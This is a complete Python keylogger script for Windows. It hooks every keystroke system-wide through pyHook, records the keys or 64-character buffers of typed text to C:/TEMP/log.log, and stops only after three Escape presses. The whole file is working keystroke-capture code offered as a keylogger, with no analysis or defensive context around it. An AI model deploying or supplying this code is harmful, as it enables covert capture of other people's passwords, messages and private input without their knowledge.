import logging
import os.path

import pythoncom
import pyHook

class Shortcuts():
    def __init__(self):
        self.escape = 0
    def update(self, key):
        if key == 'Escape':
            self.escape += 1
            if self.escape == 3:
                logging.warning("Program exited...")
                quit()
        else:
            self.escape = 0

def OnKeyboardEvent(event):
    global chrbuf
    if not buffered:
        logging.warning(event.Key + "," + chr(event.Ascii))
    else:
        if len(chrbuf) < 64:
            chrbuf += chr(event.Ascii)
        else:
            logging.warning(chrbuf)
            chrbuf = chr(event.Ascii)
    shortcuts.update(event.Key)
    return True

if not os.path.exists('C:/TEMP'):
    os.makedirs('C:/TEMP')
    open('C:/TEMP/log.log', 'a').close()

shortcuts = Shortcuts()
buffered = 1 #0unbuffered - 1buffered
if buffered:
    chrbuf = ""

logging.basicConfig(filename='C:/TEMP/log.log', format='%(message)s')
logging.warning("Keylogger started.")

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
